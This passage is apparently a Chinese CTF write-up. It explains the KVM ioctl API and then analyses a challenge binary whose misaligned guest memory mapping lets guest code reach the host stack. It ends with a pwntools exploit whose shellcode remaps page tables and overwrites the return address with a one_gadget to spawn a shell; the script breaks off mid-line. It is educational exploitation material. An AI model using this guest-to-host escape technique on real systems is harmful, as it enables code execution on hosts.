代表虚拟CPU的索引，具有多个CPU的VM将在此处分配一系列标识符，从0到系统特定的限制（可通过使用KVM_CHECK_EXTENSION检查KVM_CAP_MAX_VCPUS功能来获得）</p><h3 id="为CPU分配内存"><a href="#为CPU分配内存" class="headerlink" title="为CPU分配内存"></a>为CPU分配内存</h3><p>每个CPU都有一个关联的<code>struct kvm_run</code>的数据结构，用于CPU在内核和用户空间的信息交换，特别是，无论何时硬件虚拟化停止了，例如模拟的一些虚拟硬件，<code>kvm_run</code>结构将会包含为什么停止的信息，我们使用mmap映射它到用户内存空间内，但是首先我们需要知道分配多少内存，KVM通过KVM_GET_VCPU_MMAP_SIZE ioctl来告诉我们</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">mmap_size = ioctl(kvm, KVM_GET_VCPU_MMAP_SIZE, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure><p>需要注意的是分配的内存通常都是大于<code>kvm_run</code>的大小的，因为内核还将使用该空间来存储<code>kvm_run</code>可能指向的其他瞬时结构。</p><p>现在我们已经知道了应该分配的size，我们可以使用mmap来映射这个<code>kvm_run</code>结构了</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">run = mmap(<span class="literal">NULL</span>, mmap_size, PROT_READ | PROT_WRITE, MAP_SHARED, vcpufd, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><h3 id="设置标准和特殊寄存器"><a href="#设置标准和特殊寄存器" class="headerlink" title="设置标准和特殊寄存器"></a>设置标准和特殊寄存器</h3><p>VCPU也包含进程的寄存器状态，分为两组寄存器，一组是标准寄存器，一组是特殊寄存器。这两种寄存器对印这两个特定体系的数据结构 <code>struct kvm_regs</code> 和 <code>struct kvm_sregs</code>。在x86上，标准寄存器包括通用寄存器以及指令指针和标志。”特殊”寄存器主要包括段寄存器和控制寄存器。</p><p>在我们开始运行我们的代码之前，我们应该要先初始化这些寄存器，对于特殊寄存器我们只需要更改 cs 段寄存器，cs 段寄存器的默认状态（以及初始指令指针）指向复位向量，位于内存顶部下方16个字节处，但我们希望 cs 改为指向0，<code>kvm_sregs</code>中的每个段都包含一个完整的段描述符；我们不需要更改各种标志或限制，但是我们将 cs 的 base 和 selector 归零，这两个字段共同确定段指向的内存地址。为了避免更改任何其他初始”特殊”寄存器状态，我们将其读出，更改 cs 并将其写回：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">ioctl(vcpufd, KVM_GET_SREGS, &amp;sregs);</span><br><span class="line">sregs.cs.base = <span class="number">0</span>;</span><br><span class="line">sregs.cs.selector = <span class="number">0</span>;</span><br><span class="line">ioctl(vcpufd, KVM_SET_SREGS, &amp;sregs);</span><br></pre></td></tr></table></figure><p>对于标准寄存器，除了初始指令指针（指向代码0x1000，相对于 cs 指向0），加数（2和2）以及标志的初始状态（由x86架构指定为0x2；如果未设置此选项，则启动VM将会失败）：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kvm_regs</span> <span class="title">regs</span> =</span> &#123;</span><br><span class="line">.rip = <span class="number">0x1000</span>,</span><br><span class="line">.rax = <span class="number">2</span>,</span><br><span class="line">.rbx = <span class="number">2</span>,</span><br><span class="line">.rflags = <span class="number">0x2</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">ioctl(vcpufd, KVM_SET_REGS, &amp;regs);</span><br></pre></td></tr></table></figure><h3 id="开始运行"><a href="#开始运行" class="headerlink" title="开始运行"></a>开始运行</h3><p>现在我们VM和VCPU以及初始化好了，内存映射也初始化好了，寄存器也都初始化好了，现在可以使用<code>kvm_run ioctl()</code>运行代码了，每当虚拟化停止时，这将成功返回，例如让我们模拟硬件，因此我们将其循环运行。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">ioctl(vcpufd, KVM_RUN, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">switch</span> (run-&gt;exit_reason) &#123;</span><br><span class="line"><span class="comment">/* Handle exit */</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意，<code>KVM_RUN</code>在当前进程的上下文运行VM，并且知道仿真停止后才返回。要运行多个VM，用户空间进程必须产生多个线程，并为不同线程中的不同虚拟CPU调用<code>KVM_RUN</code>。</p><h3 id="处理退出"><a href="#处理退出" class="headerlink" title="处理退出"></a>处理退出</h3><p>我们通过检测<code>run-&gt;exit_reason</code>来看为什么退出，<code>run-&gt;exit_reason</code>包含了数十个退出原因中的一个，对应与<code>kvm_run</code>中联合的不同分支。</p><p>对于这个简单的VM，我们只处理其中的几个，并将其他的<code>exit_reason</code>视为错误。</p><p>我们将暂停视为以及结束的标志</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> KVM_EXIT_HLT:</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;KVM_EXIT_HLT&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>为了让虚拟代码输出结果，我们在I/O端口0x3f8上模拟了一个串行端口。 run-&gt; io中的字段指示方向（输入或输出），大小（1、2或4），端口和值的数量。为了传递实际数据，内核使用在kvm_run结构之后映射的缓冲区，并且run-&gt; io.data_offset提供从该映射开始的偏移量。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> KVM_EXIT_IO:</span><br><span class="line"><span class="keyword">if</span> (run-&gt;io.direction == KVM_EXIT_IO_OUT &amp;&amp;</span><br><span class="line">run-&gt;io.size == <span class="number">1</span> &amp;&amp;</span><br><span class="line">run-&gt;io.port == <span class="number">0x3f8</span> &amp;&amp;</span><br><span class="line">run-&gt;io.count == <span class="number">1</span>)</span><br><span class="line"><span class="built_in">putchar</span>(*(((<span class="keyword">char</span> *)run) + run-&gt;io.data_offset));</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">errx(<span class="number">1</span>, <span class="string">&quot;unhandled KVM_EXIT_IO&quot;</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>为了简化调试设置和运行VM的过程，我们处理了一些常见的错误。特别是，KVM_EXIT_FAIL_ENTRY在更改VM的初始条件时经常显示；这表明底层硬件虚拟化机制（在这种情况下为VT）无法启动VM，因为初始条件不符合其要求。 （在其他原因中，如果标志寄存器未设置0x2位，或者段或任务切换寄存器的初始值未通过各种设置条件，则将发生此错误。）hardware_entry_failure_reason实际上并不能区分很多情况，因此，此类错误通常需要仔细阅读硬件文档。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> KVM_EXIT_FAIL_ENTRY:</span><br><span class="line">errx(<span class="number">1</span>, <span class="string">&quot;KVM_EXIT_FAIL_ENTRY: hardware_entry_failure_reason = 0x%llx&quot;</span>,</span><br><span class="line">(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>)run-&gt;fail_entry.hardware_entry_failure_reason);</span><br></pre></td></tr></table></figure><p>当我们将所有这些放到示例代码中，对其进行构建并运行时，我们得到以下信息：</p><figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line">$ ./kvmtest</span><br><span class="line"><span class="number">4</span></span><br><span class="line">KVM_EXIT_HLT</span><br></pre></td></tr></table></figure><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> errno_kvm; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> errno_create_kvm; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> errno_set_user_memory; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> errno_create_vcpu; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> errno_set_regs; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> errno_get_sregs; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> errno_set_sregs; <span class="comment">// eax</span></span><br><span class="line">  __u32 exit_reason; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> code_size; <span class="comment">// [rsp+Ch] [rbp-8274h]</span></span><br><span class="line">  <span class="keyword">int</span> kvmfd; <span class="comment">// [rsp+10h] [rbp-8270h]</span></span><br><span class="line">  <span class="keyword">int</span> vmfd; <span class="comment">// [rsp+14h] [rbp-826Ch]</span></span><br><span class="line">  <span class="keyword">int</span> vcpu; <span class="comment">// [rsp+18h] [rbp-8268h]</span></span><br><span class="line">  <span class="keyword">int</span> v16; <span class="comment">// [rsp+1Ch] [rbp-8264h]</span></span><br><span class="line">  <span class="keyword">char</span> *aligned_guest_mem; <span class="comment">// [rsp+20h] [rbp-8260h]</span></span><br><span class="line">  <span class="keyword">size_t</span> vcpu_mmap_size; <span class="comment">// [rsp+28h] [rbp-8258h]</span></span><br><span class="line">  kvm_run *run_mem; <span class="comment">// [rsp+30h] [rbp-8250h]</span></span><br><span class="line">  __int64 v20; <span class="comment">// [rsp+38h] [rbp-8248h]</span></span><br><span class="line">  __int64 v21; <span class="comment">// [rsp+40h] [rbp-8240h]</span></span><br><span class="line">  __int64 v22; <span class="comment">// [rsp+48h] [rbp-8238h]</span></span><br><span class="line">  __u64 v23; <span class="comment">// [rsp+50h] [rbp-8230h]</span></span><br><span class="line">  __u64 v24; <span class="comment">// [rsp+58h] [rbp-8228h]</span></span><br><span class="line">  __int64 v25; <span class="comment">// [rsp+60h] [rbp-8220h]</span></span><br><span class="line">  __int64 v26; <span class="comment">// [rsp+68h] [rbp-8218h]</span></span><br><span class="line">  __int64 v27; <span class="comment">// [rsp+70h] [rbp-8210h]</span></span><br><span class="line">  kvm_userspace_memory_region region; <span class="comment">// [rsp+80h] [rbp-8200h]</span></span><br><span class="line">  kvm_regs guest_regs; <span class="comment">// [rsp+A0h] [rbp-81E0h]</span></span><br><span class="line">  kvm_sregs guest_sregs; <span class="comment">// [rsp+130h] [rbp-8150h]</span></span><br><span class="line">  <span class="keyword">char</span> guest_mem[<span class="number">32776</span>]; <span class="comment">// [rsp+270h] [rbp-8010h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v32; <span class="comment">// [rsp+8278h] [rbp-8h]</span></span><br><span class="line">  __int64 savedregs; <span class="comment">// [rsp+8280h] [rbp+0h]</span></span><br><span class="line"></span><br><span class="line">  v32 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(guest_mem, <span class="number">0</span>, <span class="number">0x8000</span>uLL);</span><br><span class="line">  aligned_guest_mem = &amp;guest_mem[<span class="number">4096LL</span> - ((&amp;savedregs + <span class="number">0x7FF0</span>) &amp; <span class="number">0xFFF</span>)];<span class="comment">// </span></span><br><span class="line">                                                <span class="comment">// 经过动调发现savedregs+0x7ff0其实就是刚才memset里面s的位置</span></span><br><span class="line">                                                <span class="comment">// 然后((&amp;savedregs + 0x7ff0) &amp; 0xfff)就是取s的地址的低3位</span></span><br><span class="line">                                                <span class="comment">// 然后用0x1000减掉低三位得到一个值,这个值也就是地址加多少可以取到最近的整数</span></span><br><span class="line">                                                <span class="comment">// 所以说这里的功能是让aligned_guest_mem取整</span></span><br><span class="line">                                                <span class="comment">// 举个例子就是假如guest_mem的起始地址为0x7fffffff5c50</span></span><br><span class="line">                                                <span class="comment">// 让他取整就是取到0x7fffffff6000</span></span><br><span class="line">  code_size = <span class="number">-1</span>;</span><br><span class="line">  read_n(<span class="number">4LL</span>, &amp;code_size);                      <span class="comment">// 这里需要输入的字符转成对应的数字需要小于0x4000,所以说输入的就应该是\x00\x40\x00\x00</span></span><br><span class="line">  <span class="keyword">if</span> ( code_size &lt;= <span class="number">0x4000</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    read_n(code_size, aligned_guest_mem);       <span class="comment">// 如果按照上面咱们输入的\x00\x40\x00\x00的话,咱们就需要输入0x4000个字符</span></span><br><span class="line">                                                <span class="comment">// 然后这些字符存储到aligned_guest_mem中</span></span><br><span class="line">    kvmfd = open(<span class="string">&quot;/dev/kvm&quot;</span>, <span class="number">0x80002</span>);</span><br><span class="line">    <span class="keyword">if</span> ( kvmfd &lt; <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      errno_kvm = open(<span class="string">&quot;/dev/kvm&quot;</span>, <span class="number">0x80002</span>);</span><br><span class="line">      kvmfd = errno_kvm;</span><br><span class="line">      err(errno_kvm, <span class="string">&quot;fail line: %d&quot;</span>, <span class="number">40LL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 0xAE01 : KVM_CREATE_VM</span></span><br><span class="line">    vmfd = ioctl(kvmfd, <span class="number">0xAE01</span>uLL, <span class="number">0LL</span>);        <span class="comment">// 创建虚拟机，获取到虚拟机句柄</span></span><br><span class="line">    <span class="keyword">if</span> ( vmfd &lt; <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      errno_create_kvm = ioctl(kvmfd, <span class="number">0xAE01</span>uLL, <span class="number">0LL</span>);</span><br><span class="line">      vmfd = errno_create_kvm;</span><br><span class="line">      err(errno_create_kvm, <span class="string">&quot;fail line: %d&quot;</span>, <span class="number">43LL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    region.slot = <span class="number">0LL</span>;</span><br><span class="line">    region.guest_phys_addr = <span class="number">0LL</span>;</span><br><span class="line">    region.memory_size = <span class="number">0x8000</span>LL;</span><br><span class="line">    region.userspace_addr = aligned_guest_mem;</span><br><span class="line">    <span class="comment">// 0x4020ae46 : KVM_SET_USER_MEMORY_REGION</span></span><br><span class="line">    <span class="keyword">if</span> ( ioctl(vmfd, <span class="number">0x4020AE46</span>uLL, &amp;region) &lt; <span class="number">0</span> )<span class="comment">// 为虚拟机映射内存,还有其他的PCI,信号处理的初始化</span></span><br><span class="line">    &#123;</span><br><span class="line">      errno_set_user_memory = ioctl(vmfd, <span class="number">0x4020AE46</span>uLL, &amp;region);</span><br><span class="line">      err(errno_set_user_memory, <span class="string">&quot;fail line: %d&quot;</span>, <span class="number">52LL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 0xae41 : KVM_CREATE_VCPU</span></span><br><span class="line">    vcpu = ioctl(vmfd, <span class="number">0xAE41</span>uLL, <span class="number">0LL</span>);         <span class="comment">// 创建vCPU</span></span><br><span class="line">    <span class="keyword">if</span> ( vcpu &lt; <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      errno_create_vcpu = ioctl(vmfd, <span class="number">0xAE41</span>uLL, <span class="number">0LL</span>);</span><br><span class="line">      vcpu = errno_create_vcpu;</span><br><span class="line">      err(errno_create_vcpu, <span class="string">&quot;fail line: %d&quot;</span>, <span class="number">55LL</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 0xAE04uLL : KVM_GET_VCPU_MMAP_SIZE</span></span><br><span class="line">    vcpu_mmap_size = ioctl(kvmfd, <span class="number">0xAE04</span>uLL, <span class="number">0LL</span>);<span class="comment">// 为vCPU分配内存空间</span></span><br><span class="line">    run_mem = mmap(<span class="number">0LL</span>, vcpu_mmap_size, <span class="number">3</span>, <span class="number">1</span>, vcpu, <span class="number">0LL</span>);</span><br><span class="line">    <span class="built_in">memset</span>(&amp;guest_regs, <span class="number">0</span>, <span class="keyword">sizeof</span>(guest_regs));</span><br><span class="line">    guest_regs._rsp = <span class="number">0xFF0</span>LL;</span><br><span class="line">    guest_regs.rflags = <span class="number">2LL</span>;</span><br><span class="line">    <span class="comment">// 0x4090ae82 : KVM_SET_REGS</span></span><br><span class="line">    <span class="keyword">if</span> ( ioctl(vcpu, <span class="number">0x4090AE82</span>uLL, &amp;guest_regs) &lt; <span class="number">0</span> )<span class="comment">// 设置寄存器</span></span><br><span class="line">    &#123;</span><br><span class="line">      errno_set_regs = ioctl(vcpu, <span class="number">0x4090AE82</span>uLL, &amp;guest_regs);</span><br><span class="line">      err(errno_set_regs, <span class="string">&quot;fail line: %d&quot;</span>, <span class="number">66LL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 0x8138AE83uLL : KVM_GET_SREGS</span></span><br><span class="line">    <span class="keyword">if</span> ( ioctl(vcpu, <span class="number">0x8138AE83</span>uLL, &amp;guest_sregs) &lt; <span class="number">0</span> )<span class="comment">// 获取特殊寄存器</span></span><br><span class="line">    &#123;</span><br><span class="line">      errno_get_sregs = ioctl(vcpu, <span class="number">0x8138AE83</span>uLL, &amp;guest_sregs);</span><br><span class="line">      err(errno_get_sregs, <span class="string">&quot;fail line: %d&quot;</span>, <span class="number">69LL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    v20 = <span class="number">0x7000</span>LL;</span><br><span class="line">    v21 = <span class="number">0x6000</span>LL;</span><br><span class="line">    v22 = <span class="number">0x5000</span>LL;</span><br><span class="line">    v23 = <span class="number">0x4000</span>LL;</span><br><span class="line">    *(aligned_guest_mem + <span class="number">0xE00</span>) = <span class="number">3LL</span>;         <span class="comment">// 设置4级页表,因为cr0对应的第31位的值为1,所以说开启了分页机制所以就需要设置4级页表</span></span><br><span class="line">                                                <span class="comment">// 这里看了一眼汇编代码这里虽然加的是0xe00,但是对应汇编代码加的还是0x7000</span></span><br><span class="line">    *&amp;aligned_guest_mem[v20 + <span class="number">8</span>] = <span class="number">0x1003</span>LL;</span><br><span class="line">    *&amp;aligned_guest_mem[v20 + <span class="number">16</span>] = <span class="number">0x2003</span>LL;</span><br><span class="line">    *&amp;aligned_guest_mem[v20 + <span class="number">24</span>] = <span class="number">0x3003</span>LL;</span><br><span class="line">    *&amp;aligned_guest_mem[v21] = v20 | <span class="number">3</span>;</span><br><span class="line">    *&amp;aligned_guest_mem[v22] = v21 | <span class="number">3</span>;</span><br><span class="line">    *&amp;aligned_guest_mem[v23] = v22 | <span class="number">3</span>;</span><br><span class="line">    v25 = <span class="number">0LL</span>;</span><br><span class="line">    v26 = <span class="number">0x1030010FFFFFFFF</span>LL;</span><br><span class="line">    v27 = <span class="number">0x101010000</span>LL;</span><br><span class="line">    guest_sregs.cr3 = v23;</span><br><span class="line">    guest_sregs.cr4 = <span class="number">32LL</span>;</span><br><span class="line">    guest_sregs.cr0 = <span class="number">0x80050033</span>LL;</span><br><span class="line">    guest_sregs.efer = <span class="number">0x500</span>LL;</span><br><span class="line">    guest_sregs.cs.base = <span class="number">0LL</span>;</span><br><span class="line">    *&amp;guest_sregs.cs.limit = <span class="number">0x10B0008FFFFFFFF</span>LL;</span><br><span class="line">    *&amp;guest_sregs.cs.dpl = <span class="number">0x101010000</span>LL;</span><br><span class="line">    guest_sregs.ss.base = <span class="number">0LL</span>;</span><br><span class="line">    *&amp;guest_sregs.ss.limit = <span class="number">0x1030010FFFFFFFF</span>LL;</span><br><span class="line">    *&amp;guest_sregs.ss.dpl = <span class="number">0x101010000</span>LL;</span><br><span class="line">    guest_sregs.gs.base = <span class="number">0LL</span>;</span><br><span class="line">    *&amp;guest_sregs.gs.limit = <span class="number">0x1030010FFFFFFFF</span>LL;</span><br><span class="line">    *&amp;guest_sregs.gs.dpl = <span class="number">0x101010000</span>LL;</span><br><span class="line">    guest_sregs.fs.base = <span class="number">0LL</span>;</span><br><span class="line">    *&amp;guest_sregs.fs.limit = <span class="number">0x1030010FFFFFFFF</span>LL;</span><br><span class="line">    *&amp;guest_sregs.fs.dpl = <span class="number">0x101010000</span>LL;</span><br><span class="line">    guest_sregs.es.base = <span class="number">0LL</span>;</span><br><span class="line">    *&amp;guest_sregs.es.limit = <span class="number">0x1030010FFFFFFFF</span>LL;</span><br><span class="line">    *&amp;guest_sregs.es.dpl = <span class="number">0x101010000</span>LL;</span><br><span class="line">    guest_sregs.ds.base = <span class="number">0LL</span>;</span><br><span class="line">    *&amp;guest_sregs.ds.limit = <span class="number">0x1030010FFFFFFFF</span>LL;</span><br><span class="line">    *&amp;guest_sregs.ds.dpl = <span class="number">0x101010000</span>LL;</span><br><span class="line">    <span class="comment">// 0x4138AE84 : KVM_SET_SREGS</span></span><br><span class="line">    <span class="keyword">if</span> ( ioctl(vcpu, <span class="number">0x4138AE84</span>uLL, &amp;guest_sregs) &lt; <span class="number">0</span> )<span class="comment">// 设置特殊寄存器</span></span><br><span class="line">    &#123;</span><br><span class="line">      errno_set_sregs = ioctl(vcpu, <span class="number">0x4138AE84</span>uLL, &amp;guest_sregs);</span><br><span class="line">      err(errno_set_sregs, <span class="string">&quot;fail line: %d&quot;</span>, <span class="number">105LL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 0xae80 : KVM_RUN</span></span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      ioctl(vcpu, <span class="number">0xAE80</span>uLL, <span class="number">0LL</span>);              <span class="comment">// 开始运行虚拟机</span></span><br><span class="line">      exit_reason = run_mem-&gt;exit_reason;</span><br><span class="line">      <span class="keyword">if</span> ( exit_reason == <span class="number">5</span> || exit_reason == <span class="number">8</span> )<span class="comment">// KVM_EXIT_HLT | KVM_EXIT_SHUTDOWN</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> ( exit_reason == <span class="number">2</span> )                   <span class="comment">// KVM_EXIT_IO</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( run_mem-&gt;io.direction == <span class="number">1</span> &amp;&amp; run_mem-&gt;io.port == <span class="number">0x3F8</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v16 = run_mem-&gt;io.size;</span><br><span class="line">          v24 = run_mem-&gt;io.data_offset;</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;%.*s&quot;</span>, v16 * run_mem-&gt;ex.error_code, run_mem + v24);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n[loop] exit reason: %d\n&quot;</span>, run_mem-&gt;exit_reason);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n[loop] goodbye!&quot;</span>);</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[init] hold your horses&quot;</span>);</span><br><span class="line">    result = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>漏洞点：</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">memset</span>(guest_mem, <span class="number">0</span>, <span class="number">0x8000</span>uLL);</span><br><span class="line">aligned_guest_mem = &amp;guest_mem[<span class="number">4096LL</span> - ((&amp;savedregs + <span class="number">0x7FF0</span>) &amp; <span class="number">0xFFF</span>)];</span><br><span class="line"></span><br><span class="line">region.slot = <span class="number">0LL</span>;</span><br><span class="line">region.guest_phys_addr = <span class="number">0LL</span>;</span><br><span class="line">region.memory_size = <span class="number">0x8000</span>LL;</span><br><span class="line">region.userspace_addr = aligned_guest_mem;</span><br></pre></td></tr></table></figure><p>从上面的代码可以看出程序预计给虚拟机分配0x8000大小的空间，然后进行了个对齐操作使得分配的真实地址为aligned_guest_mem，然后后面实际再给虚拟机分配的时候还是分配了0x8000大小的空间，这样就会导致虚拟机越界读到了主机的内存。</p><p>首先我们看到我们memset的地址如下</p><p><img src="https://i.loli.net/2020/09/25/vHc9aoD4Smt6XAw.png" alt="image-20200925224629609.png"></p><p>对齐后的地址如下。</p><p><img src="https://i.loli.net/2020/09/25/zHNjYs5uEqfrtDx.png" alt="image-20200925224707504.png"></p><p>通过动态调试我们发现返回地址所在地址<code>(0x7FFFFFFFDE68)</code>包含在<code>aligned_guest_mem(0x7FFFFFFF6000)</code>到<code>aligned_guest_mem+0x8000(0x7FFFFFFFE000)</code>内，注意此处的aligned_guest_mem是通过分配host的栈空间作为VM的进程空间。对于host来说地址是<code>aligned_guest_mem</code>到<code>aligned_guest_mem+0x8000</code>，而对于虚拟机来说地址是<code>0</code>到<code>0x8000</code>。</p><p><img src="https://i.loli.net/2020/09/25/EPRjwCrOscaJSbm.png" alt="image-20200925225217368.png"></p><p>用下图来更清晰的表示。</p><p><img src="https://i.loli.net/2020/09/25/9UJeq7CaGh4d3ID.png" alt="image-20200925224348738.png"></p><p>然后程序有两个输入点，第一个输入的值会作为第二个输入点的可输入长度然后第二个输入点，输入的内容可以作为shellcode执行。</p><p>下面就是利用这个地方，在动调的过程中可以发现最后main返回的地址是存储在over这个区域的，所以就需要对存储返回地址的地方进行写操作，写成onegadget的地址就可以拿到shell了，写操作需要注意的就是[0x1000]这样读0x1000地址存储的内容不一定会读到0x1000，因为有分页机制所以虚拟地址需要转换成物理地址才可以使用，还需要注意一点的是64位环境下使用的是4级页表是48位，然后分为9、9、9、12四段，如下图所示。</p><p><img src="https://i.loli.net/2020/09/25/N2RVtIPu9kFXejn.png" alt="image-20200925230016886.png"></p><p>根据这四段来获取到物理地址所以我们的shellcode就需要确保经过转换后的地址对应着的是返回地址。</p><p>具体的做法就是<strong>更改cr3的值</strong>，<strong>自己构造4级页表</strong>，<strong>促使[0x1000]这样访问到的内存就是0x7000地址处的内存</strong>，这里访问到0x7000是因为0x7000到0x8000包含了越界的部分，所以我们只需要循环遍历0x7000到0x8000以便找到ebp，从而控制执行流，其中页表的访问方式就应该是这样的，用我手画的图表示如下（以访问0x1000为例）：</p><p><img src="https://i.loli.net/2020/09/25/ZGhBCqprunD48x5.png" alt="image-20200925230906050.png"></p><p>后面的0x1003、0x2003、0x3003等在ida中可看到。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">v20 = <span class="number">0x7000</span>LL;</span><br><span class="line">v21 = <span class="number">0x6000</span>LL;</span><br><span class="line">v22 = <span class="number">0x5000</span>LL;</span><br><span class="line">v23 = <span class="number">0x4000</span>LL;</span><br><span class="line">*(aligned_guest_mem + <span class="number">0xE00</span>) = <span class="number">3LL</span>;</span><br><span class="line">*&amp;aligned_guest_mem[v20 + <span class="number">8</span>] = <span class="number">0x1003</span>LL;</span><br><span class="line">*&amp;aligned_guest_mem[v20 + <span class="number">16</span>] = <span class="number">0x2003</span>LL;</span><br><span class="line">*&amp;aligned_guest_mem[v20 + <span class="number">24</span>] = <span class="number">0x3003</span>LL;</span><br></pre></td></tr></table></figure><p>所以我们的shellcode就需要确保经过转换后的地址对应着的是返回地址，然后把返回地址改成oengadget就可以拿到shell了。</p><p>exp最开始设置访问的地址是0x1020，然后一直循环访问到对应地址存储的内容不是0的地方，经过动调发现在retun的返回地址前只有3个地址是有内容的，再往前看都是0，所以循环结束后访问的地址就是return的返回地址-3，所以要修改retuen的地址就需要+3，然后把这个地址里面的内容修改成one_gadget就可以拿到shell了。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p = process(<span class="string">&quot;./kvm&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./kvm&quot;</span>)</span><br><span class="line">payload = asm(</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    mov qword ptr [0x1000], 0x2003</span></span><br><span class="line"><span class="string">    mov qword ptr [0x2000], 0x3003</span></span><br><span class="line"><span class="string">    mov qword ptr [0x3000], 0x0003</span></span><br><span class="line"><span class="string">    mov qword ptr [0x0], 0x3</span></span><br><span class="line"><span class="string">    mov qword ptr [0x8], 0x7003</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rax, 0x1000</span></span><br><span class="line"><span class="string">    mov cr3, rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rcx, 0x1020</span></span><br><span class="line"><span class="string">#############search ret#############</span></span><br><span class="line"><span class="string">look_for_ra:   </span></span><br><span class="line"><span class="string">    add rcx, 8</span></span><br><span class="line"><span class="string">    cmp qword ptr [rcx], 0</span></span><br><span class="line"><span class="string">    je look_for_ra</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    add rcx, 24</span></span><br><span class="line"><span class="string">#############overwrite ret#############</span></span><br><span class="line"><span class="string">overwrite_ra:  </span></span><br><span class="line"><span class="string">    mov rax, qword ptr [rcx]</span></span><br><span class="line"><span class="string">    add rax, 0x249e6</span></span><br><span class="line"><span class="string">    mov qword ptr [rcx], rax</span></span><br><span class="line"><span class="string">    hlt</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">)</span><br><span class="line">log.success(<span class="string">&#x27;len = &#x27;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line">p.send(<span class="string">&quot;\x68\x00\x00\x00&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.recv(<span class="number">16</span>)</span><br><span class="line"><span 